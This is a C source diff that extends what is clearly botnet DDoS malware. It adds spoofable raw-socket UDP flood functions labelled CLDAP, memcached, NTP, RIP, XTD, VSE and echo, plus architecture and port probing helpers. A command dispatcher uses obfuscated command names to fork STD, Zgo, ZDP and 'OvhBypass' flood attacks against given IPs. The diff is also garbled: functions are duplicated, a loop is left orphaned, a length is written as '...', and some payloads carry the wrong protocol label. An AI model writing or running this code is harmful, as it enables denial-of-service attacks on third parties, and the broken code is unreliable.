@@ -1370,27 +1370,1357 @@ void makecldappacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t 
     iph->daddr = dest;
 }
 /**
- * Performs a CLDAP attack on a target IP address
+ * Performs a CLDAP attack on a target IP address.
  *
- * @param target Target IP address as a string
- * @param port Target port number
- * @param timeEnd Duration to send packets in seconds
- * @param spoofit IP spoofing level
- * @param packetsize Size of each packet
- * @param pollinterval Interval to change the port
- * @param sleepcheck Interval to sleep
- * @param sleeptime Sleep time in milliseconds
+ * @param target Target IP address as a string.
+ * @param port Target port number.
+ * @param timeEnd Duration to send packets in seconds.
+ * @param spoofit IP spoofing level.
+ * @param packetsize Size of each packet.
+ * @param pollinterval Interval to change the port.
+ * @param sleepcheck Interval to sleep.
+ * @param sleeptime Sleep time in milliseconds.
  */
 void cldapattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
-    // ... (Initialization code similar to the makecldappacket function)
-    
+    int sockfd;
+    if (spoofit == 32) {
+        sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    } else {
+        sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+    }
+    if (sockfd < 0) {
+        return; // check if socket creation was successful
+    }
+
+    struct sockaddr_in dest_addr;
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_port = (port == 0) ? rand_cmwc() : htons(port);
+    if (getHost(target, &dest_addr.sin_addr)) return; // check if hostname resolution was successful
+    memset(dest_addr.sin_zero, '\0', sizeof(dest_addr.sin_zero));
+
+    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
+    if (buf == NULL) {
+        close(sockfd);
+        return; // check for malloc failure
+    }
+    memset(buf, 0, packetsize + 1);
+    makeRandomStr(buf, packetsize);
+
+    int end = time(NULL) + timeEnd;
+    for (unsigned int i = 0, ii = 0; ; ) {
+        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+        if (i++ == pollinterval) {
+            dest_addr.sin_port = (port == 0) ? rand_cmwc() : htons(port);
+            if (time(NULL) > end) break; // exit loop after the specified duration
+            i = 0;
+        }
+        if (ii++ == sleepcheck) {
+            usleep(sleeptime * 1000); // sleep for specified time
+            ii = 0;
+        }
+    }
+    free(buf);
+    close(sockfd);
+}
+/**
+ * constructs a packet with a memcached payload
+ *
+ * @param iph pointer to the ip header structure
+ * @param dest destination ip address
+ * @param source source ip address
+ * @param protocol ip protocol
+ * @param packetSize size of the payload
+ */
+void makemempacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
+    char *mem_payload = "\x00\x01\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x0d\x0a";
+    int mem_payload_len = 15; // length of the memcached payload
+
+    // setting up the ip header
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + packetSize + mem_payload_len;
+    iph->id = rand_cmwc();
+    iph->frag_off = 0;
+    iph->ttl = MAXTTL;
+    iph->protocol = protocol;
+    iph->check = 0; // checksum is calculated later
+    iph->saddr = source;
+    iph->daddr = dest;
+}
+/**
+ * performs a memcached attack on a target ip address
+ *
+ * @param target target ip address as a string
+ * @param port target port number
+ * @param timeEnd duration to send packets in seconds
+ * @param spoofit ip spoofing level
+ * @param packetsize size of each packet
+ * @param pollinterval interval to change port
+ * @param sleepcheck interval to sleep
+ * @param sleeptime sleep time in milliseconds
+ */
+void memattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
+    char *mem_payload;
+    int mem_payload_len;
+    mem_payload = "\x00\x01\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x0d\x0a";
+    mem_payload_len = 15; // length of mem payload
+
+    struct sockaddr_in dest_addr;
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
+    if (getHost(target, &dest_addr.sin_addr)) return; // hostname resolution check
+    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
+
+    int sockfd;
+    if (spoofit == 32) {
+        sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    } else {
+        sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+        int tmp = 1;
+        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
+            close(sockfd);
+            return;
+        }
+    }
+    if (!sockfd) {
+        return; // socket creation check
+    }
+
+    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
+    if (buf == NULL) {
+        close(sockfd);
+        return; // memory allocation check
+    }
+    memset(buf, 0, packetsize + 1);
+    makeRandomStr(buf, packetsize);
+
+    int end = time(NULL) + timeEnd;
+    for (unsigned int i = 0, ii = 0; ; ) {
+        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+        if (i++ == pollinterval) {
+            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
+            if (time(NULL) > end) break; // timing check
+            i = 0;
+        }
+        if (ii++ == sleepcheck) {
+            usleep(sleeptime * 1000); // sleep for sleeptime
+            ii = 0;
+        }
+    }
+    free(buf);
+    close(sockfd);
+}
+
+/**
+ * constructs a packet with an ntp payload
+ *
+ * @param iph pointer to the ip header structure
+ * @param dest destination ip address
+ * @param source source ip address
+ * @param protocol ip protocol
+ * @param packetSize size of the payload
+ */
+void makentppacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
+    char *ntp_payload = "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x6f\x73\x74\x3a\x32\x33\x39\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x0d\x0a\x53\x54\x3a\x73\x73\x64\x70\x3a\x61\x6c\x6c\x0d\x0a\x4d\x61\x6e\x3a\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x33\x0d\x0a\x0d\x0a";
+    int ntp_payload_len = 97; // length of the ntp payload
+
+    // setting up the ip header
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + packetSize + ntp_payload_len;
+    iph->id = rand_cmwc();
+    iph->frag_off = 0;
+    iph->ttl = MAXTTL;
+    iph->protocol = protocol;
+    iph->check = 0; // checksum is calculated later
+    iph->saddr = source;
+    iph->daddr = dest;
+}
+/**
+ * performs an ntp attack on a target ip address
+ *
+ * @param target target ip address as a string
+ * @param port target port number
+ * @param timeEnd duration to send packets in seconds
+ * @param spoofit ip spoofing level
+ * @param packetsize size of each packet
+ * @param pollinterval interval to change port
+ * @param sleepcheck interval to sleep
+ * @param sleeptime sleep time in milliseconds
+ */
+void ntpattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
+    char *ntp_payload = "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x6f\x73\x74\x3a\x32\x33\x39\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x0d\x0a\x53\x54\x3a\x73\x73\x64\x70\x3a\x61\x6c\x6c\x0d\x0a\x4d\x61\x6e\x3a\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x33\x0d\x0a\x0d\x0a";
+    int ntp_payload_len = 97;
     struct sockaddr_in dest_addr;
     dest_addr.sin_family = AF_INET;
     dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
     if (getHost(target, &dest_addr.sin_addr)) return;
     memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
 
-    // ... (Socket creation and packet sending code similar to previous functions)
+    int sockfd = (spoofit == 32) ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+    if (sockfd < 0) return;
+
+    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
+    if (buf == NULL) {
+        close(sockfd);
+        return;
+    }
+    memset(buf, 0, packetsize + 1);
+    makeRandomStr(buf, packetsize);
+
+    int end = time(NULL) + timeEnd;
+    for (unsigned int i = 0, ii = 0;;) {
+        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+        if (i++ == pollinterval) {
+            if (port == 0) dest_addr.sin_port = rand_cmwc();
+            if (time(NULL) > end) break;
+            i = 0;
+        }
+        if (ii++ == sleepcheck) {
+            usleep(sleeptime * 1000);
+            ii = 0;
+        }
+    }
+
+    free(buf);
+    close(sockfd);
+}
+/**
+ * constructs a packet with a rip payload
+ *
+ * @param iph pointer to the ip header structure
+ * @param dest destination ip address
+ * @param source source ip address
+ * @param protocol ip protocol
+ * @param packetSize size of the payload
+ */
+void makerippacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
+    char *rip_payload = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10";
+    int rip_payload_len = 24;
+
+    // setting up the ip header
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + packetSize + rip_payload_len;
+    iph->id = rand_cmwc();
+    iph->frag_off = 0;
+    iph->ttl = MAXTTL;
+    iph->protocol = protocol;
+    iph->check = 0; // checksum is calculated later
+    iph->saddr = source;
+    iph->daddr = dest;
+}
+/**
+ * performs a rip attack on a target ip address
+ * sets up socket and payload, then sends packets in a loop
+ * either using udp (if spoofit is 32) or raw sockets
+ *
+ * @param target target ip address as a string
+ * @param port target port number
+ * @param timeEnd duration to send packets in seconds
+ * @param spoofit ip spoofing level
+ * @param packetsize size of each packet
+ * @param pollinterval interval to change port
+ * @param sleepcheck interval to sleep
+ * @param sleeptime sleep time in milliseconds
+ */
+void ripattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
+    char *rip_payload = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10";
+    int rip_payload_len = 24;
+    struct sockaddr_in dest_addr;
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
+    if (getHost(target, &dest_addr.sin_addr)) return;
+    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
+
+    int sockfd = (spoofit == 32) ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+    if (sockfd < 0) return;
+
+    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
+    if (buf == NULL) {
+        close(sockfd);
+        return;
+    }
+    memset(buf, 0, packetsize + 1);
+    makeRandomStr(buf, packetsize);
+
+    int end = time(NULL) + timeEnd;
+    for (unsigned int i = 0, ii = 0;;) {
+        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+        if (i++ == pollinterval) {
+            if (port == 0) dest_addr.sin_port = rand_cmwc();
+            if (time(NULL) > end) break;
+            i = 0;
+        }
+        if (ii++ == sleepcheck) {
+            usleep(sleeptime * 1000);
+            ii = 0;
+        }
+    }
+
+    free(buf);
+    close(sockfd);
+}
+/**
+ * constructs a packet with an extended payload
+ * the payload and length are hardcoded
+ *
+ * @param iph pointer to the ip header structure
+ * @param dest destination ip address
+ * @param source source ip address
+ * @param protocol ip protocol
+ * @param packetSize size of the payload
+ */
+void makextdpacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
+    char *xtd_payload = "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
+    int xtd_payload_len = 220; // approximated length of the xtd_payload
+
+    // setting up the ip header
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + packetSize + xtd_payload_len;
+    iph->id = rand_cmwc();
+    iph->frag_off = 0;
+    iph->ttl = MAXTTL;
+    iph->protocol = protocol;
+    iph->check = 0; // checksum is calculated later
+    iph->saddr = source;
+    iph->daddr = dest;
+}
+/**
+ * performs an xtd attack on a target ip address
+ * 
+ * @param target target ip address as a string
+ * @param port target port number
+ * @param timeEnd duration to send packets in seconds
+ * @param spoofit ip spoofing level
+ * @param packetsize size of each packet
+ * @param pollinterval interval to change port
+ * @param sleepcheck interval to sleep
+ * @param sleeptime sleep time in milliseconds
+ */
+/**
+ * performs an xtd attack on a target ip address
+ * 
+ * @param target target ip address as a string
+ * @param port target port number
+ * @param timeEnd duration to send packets in seconds
+ * @param spoofit ip spoofing level
+ * @param packetsize size of each packet
+ * @param pollinterval interval to change port
+ * @param sleepcheck interval to sleep
+ * @param sleeptime sleep time in milliseconds
+ */
+void xtdattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
+    // define the payload and its length
+    char *xtd_payload = "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e..."; // truncated for brevity
+    int xtd_payload_len = ...; // actual length of xtd_payload
+
+    // set up destination address structure
+    struct sockaddr_in dest_addr;
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
+    if (getHost(target, &dest_addr.sin_addr)) return;
+
+    // create socket based on spoofing parameter
+    int sockfd = spoofit == 32 ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+    if (sockfd < 0) return;
+
+    // buffer for sending packets
+    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
+    if (buf == NULL) {
+        close(sockfd);
+        return;
+    }
+
+    // main loop for sending packets
+    int end = time(NULL) + timeEnd;
+    for (unsigned int i = 0, ii = 0;;) {
+        // send packet
+        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+
+        // handle poll interval
+        if (i++ == pollinterval) {
+            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
+            if (time(NULL) > end) break;
+            i = 0;
+        }
+
+        // sleep check
+        if (ii++ == sleepcheck) {
+            usleep(sleeptime * 1000);
+            ii = 0;
+        }
+    }
+
+    // clean up
+    free(buf);
+    close(sockfd);
+}
+/**
+ * constructs a packet with a vse payload
+ *
+ * @param iph pointer to the ip header structure
+ * @param dest destination ip address
+ * @param source source ip address
+ * @param protocol ip protocol
+ * @param packetSize size of the payload
+ */
+void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
+    // define the payload and its length
+    char *vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79";
+    int vse_payload_len = 20;
+
+    // setting up the ip header
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
+    iph->id = rand_cmwc();
+    iph->frag_off = 0;
+    iph->ttl = MAXTTL;
+    iph->protocol = protocol;
+    iph->check = 0; // checksum is calculated later
+    iph->saddr = source;
+    iph->daddr = dest;
+}
+/**
+ * performs a vse attack on a target ip address
+ *
+ * @param target target ip address as a string
+ * @param port target port number
+ * @param timeEnd duration to send packets in seconds
+ * @param spoofit ip spoofing level
+ * @param packetsize size of each packet
+ * @param pollinterval interval to change port
+ * @param sleepcheck interval to sleep
+ * @param sleeptime sleep time in milliseconds
+ */
+void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
+    char *vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79";
+    int vse_payload_len = 20;
+
+    struct sockaddr_in dest_addr;
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
+    if (getHost(target, &dest_addr.sin_addr)) return;
+    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
+
+    int sockfd = spoofit == 32 ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+    if (sockfd < 0) return;
+
+    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
+    if (buf == NULL) {
+        close(sockfd);
+        return;
+    }
+    memset(buf, 0, packetsize + 1);
+    makeRandomStr(buf, packetsize);
+
+    int end = time(NULL) + timeEnd;
+    for (unsigned int i = 0, ii = 0;;) {
+        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+
+        if (i++ == pollinterval) {
+            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
+            if (time(NULL) > end) break;
+            i = 0;
+        }
+
+        if (ii++ == sleepcheck) {
+            usleep(sleeptime * 1000);
+            ii = 0;
+        }
+    }
+
+    free(buf);
+    close(sockfd);
+}
+
+    // main loop for sending packets
+    int end = time(NULL) + timeEnd;
+    for (unsigned int i = 0, ii = 0;;) {
+        // send packet
+        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+
+        // handle poll interval
+        if (i++ == pollinterval) {
+            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
+            if (time(NULL) > end) break;
+            i = 0;
+        }
+
+        // sleep check
+        if (ii++ == sleepcheck) {
+            usleep(sleeptime * 1000);
+            ii = 0;
+        }
+    }
+
+    // clean up
+    free(buf);
+    close(sockfd);
+}
+/**
+ * constructs a packet with a vse payload
+ *
+ * @param iph pointer to the ip header structure
+ * @param dest destination ip address
+ * @param source source ip address
+ * @param protocol ip protocol
+ * @param packetSize size of the payload
+ */
+void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
+    // define the payload and its length
+    char *vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79";
+    int vse_payload_len = 20;
+
+    // setting up the ip header
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
+    iph->id = rand_cmwc();
+    iph->frag_off = 0;
+    iph->ttl = MAXTTL;
+    iph->protocol = protocol;
+    iph->check = 0; // checksum is calculated later
+    iph->saddr = source;
+    iph->daddr = dest;
+}
+
+/**
+ * constructs a packet with an echo payload
+ *
+ * @param iph pointer to the ip header structure
+ * @param dest destination ip address
+ * @param source source ip address
+ * @param protocol ip protocol
+ * @param packetSize size of the payload
+ */
+void makeechopacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
+    char *echo_payload = "\x0D\x0A\x0D\x0A";
+    int echo_payload_len = 4;
+
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + packetSize + echo_payload_len;
+    iph->id = rand_cmwc();
+    iph->frag_off = 0;
+    iph->ttl = MAXTTL;
+    iph->protocol = protocol;
+    iph->check = 0;
+    iph->saddr = source;
+    iph->daddr = dest;
+}
+/**
+ * performs an echo attack on a target ip address
+ * 
+ * @param target target ip address as a string
+ * @param port target port number
+ * @param timeEnd duration to send packets in seconds
+ * @param spoofit ip spoofing level
+ * @param packetsize size of each packet
+ * @param pollinterval interval to change port
+ * @param sleepcheck interval to sleep
+ * @param sleeptime sleep time in milliseconds
+ */
+void echoattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
+    // define the payload and its length
+    char *echo_payload = "\x0D\x0A\x0D\x0A";
+    int echo_payload_len = 4; // actual length of echo_payload
+
+    // set up destination address structure
+    struct sockaddr_in dest_addr;
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
+    if (getHost(target, &dest_addr.sin_addr)) return;
+
+    // create socket based on spoofing parameter
+    int sockfd = spoofit == 32 ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+    if (sockfd < 0) return;
+
+    // buffer for sending packets
+    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
+    if (buf == NULL) {
+        close(sockfd);
+        return;
+    }
+
+    // main loop for sending packets
+    int end = time(NULL) + timeEnd;
+    for (unsigned int i = 0, ii = 0;;) {
+        // send packet
+        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+
+        // handle poll interval
+        if (i++ == pollinterval) {
+            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
+            if (time(NULL) > end) break;
+            i = 0;
+        }
+
+        // sleep check
+        if (ii++ == sleepcheck) {
+            usleep(sleeptime * 1000);
+            ii = 0;
+        }
+    }
+
+    // clean up
+    free(buf);
+    close(sockfd);
+}
+/**
+ * establishes a TCP connection to a given host and port
+ * 
+ * @param host hostname or ip address to connect
+ * @param port port number to connect
+ * @return socket descriptor if successful, 0 otherwise
+ */
+int socket_connect(char *host, in_port_t port) {
+    struct hostent *hp;
+    struct sockaddr_in addr;
+    int on = 1, sock;
+
+    // resolving the host name
+    if ((hp = gethostbyname(host)) == NULL) return 0;
+    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
+
+    // setting up socket address structure
+    addr.sin_port = htons(port);
+    addr.sin_family = AF_INET;
+
+    // creating socket
+    sock = socket(PF_INET, SOCK_STREAM, 0);
+    if (sock == -1) return 0;
+
+    // setting socket options
+    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
+
+    // establishing connection
+    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
+
+    return sock;
+}
+/**
+ * returns the architecture type as a string
+ * checks various predefined macros to determine the architecture
+ */
+char *getArch() {
+    #if defined(__x86_64__) || defined(_M_X64)
+    return "x86_64"; // for 64-bit x86 architecture
+    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
+    return "x86_32"; // for 32-bit x86 architecture
+    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
+    return "Arm4";   // for ARM v4 architecture
+    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
+    return "Arm5";   // for ARM v5 architecture
+    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
+    return "Arm6";   // for ARM v6 architecture
+    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
+    return "Arm7";   // for ARM v7 architecture
+    #elif defined(mips) || defined(__mips__) || defined(__mips)
+    return "Mips";   // for MIPS architecture
+    #elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
+    return "Mipsel"; // for MIPS (little-endian) architecture
+    #elif defined(__sh__)
+    return "Sh4";    // for SuperH architecture
+    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
+    return "Ppc";    // for PowerPC architecture
+    #elif defined(__sparc__) || defined(__sparc)
+    return "spc";    // for SPARC architecture
+    #elif defined(__m68k__)
+    return "M68k";   // for Motorola 68k architecture
+    #elif defined(__arc__)
+    return "Arc";    // for ARC architecture
+    #else
+    return "Unknown Architecture"; // if none of the above
+    #endif
+}
+/**
+ * returns a port number as a string based on available programs
+ * checks for the existence of certain programs and returns a specific port
+ */
+char *getPorts() {
+    // Check for Python, Perl, and Telnetd. If any exist, return port "22"
+    if (access("/usr/bin/python", F_OK) != -1) {
+        return "22";
+    }
+    if (access("/usr/bin/python3", F_OK) != -1) {
+        return "22";
+    }
+    if (access("/usr/bin/perl", F_OK) != -1) {
+        return "22";
+    }
+    if (access("/usr/sbin/telnetd", F_OK) != -1) {
+        return "22";
+    }
+
+    // If none of the above programs exist, return "Unknown Port"
+    return "unknown port";
+}
+void processCmd(int argc, unsigned char *argv[]) {
+    // handling the "Tard UDP" command
+    if (!strcmp(argv[0], decode("1-|"))) { // UDP ip port time
+        if (argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1) { 
+            return;
+        }
+        unsigned char *ip = argv[1];
+        int port = atoi(argv[2]);
+        int time = atoi(argv[3]);
+        int spoofed = 32;
+        int packetsize = 10000;
+        int pollinterval = 10;
+        int sleepcheck = 1000000;
+        int sleeptime = 0;
+        if (strstr(ip, ",") != NULL) {
+            unsigned char *hi = strtok(ip, ",");
+            while (hi != NULL) {
+                if (!listFork()) {
+                    k2o_BB2(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                    _exit(0);
+                }
+                hi = strtok(NULL, ",");
+            }
+        } else {
+            if (!listFork()) {
+                k2o_BB2(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                _exit(0);
+            }
+        }
+        return;
+    }
+
+    // command for STD attack
+    if(!strcmp(argv[0], decode("6c-"))){
+        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
+            return;
+        }
+        unsigned char *ip = argv[1];
+        int port = atoi(argv[2]);
+        int time = atoi(argv[3]);
+        if(strstr(ip, ",") != NULL){
+            unsigned char *hi = strtok(ip, ",");
+            while(hi != NULL){
+                if(!listFork()){
+                    sendSTD(hi, port, time);
+                    _exit(0);
+                }
+                hi = strtok(NULL, ",");
+            }
+        } else {
+            if (listFork()) { return; }
+            sendSTD(ip, port, time);
+            _exit(0);
+        }
+    }
+
+    // command for Zgo attack
+    if(!strcmp(argv[0], decode("@<j"))){
+        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
+            return;
+        }
+        unsigned char *ip = argv[1];
+        int port = atoi(argv[2]);
+        int time = atoi(argv[3]);
+        if(strstr(ip, ",") != NULL){
+            unsigned char *hi = strtok(ip, ",");
+            while(hi != NULL){
+                if(!listFork()){
+                    sendZgo(hi, port, time);
+                    _exit(0);
+                }
+                hi = strtok(NULL, ",");
+            }
+        } else {
+            if (listFork()) { return; }
+            sendZgo(ip, port, time);
+            _exit(0);
+        }
+    }
+
+    // command for ZDP attack
+    if(!strcmp(argv[0], decode("@-|"))){
+        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
+            return;
+        }
+        unsigned char *ip = argv[1];
+        int port = atoi(argv[2]);
+        int time = atoi(argv[3]);
+        if(strstr(ip, ",") != NULL){
+            unsigned char *hi = strtok(ip, ",");
+            while(hi != NULL){
+                if(!listFork()){
+                    sendZDP(hi, port, time);
+                    _exit(0);
+                }
+                hi = strtok(NULL, ",");
+            }
+        } else {
+            if (listFork()) { return; }
+            sendZDP(ip, port, time);
+            _exit(0);
+        }
+    }
+
+    // command for OvhBypassOne attack
+    if(!strcmp(argv[0], decode(",dj"))){
+        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
+            return;
+        }
+        unsigned char *ip = argv[1];
+        int port = atoi(argv[2]);
+        int time = atoi(argv[3]);
+        if(strstr(ip, ",") != NULL){
+            unsigned char *hi = strtok(ip, ",");
+            while(hi != NULL){
+                if(!listFork()){
+                    sendOvhBypassOne(hi, port, time);
+                    _exit(0);
+                }
+                hi = strtok(NULL, ",");
+            }
+        } else {
+            if (listFork()) { return; }
+            sendOvhBypassOne(ip, port, time);
+            _exit(0);
+        }
+    }
+
+    // command for OvhBypassTwo attack
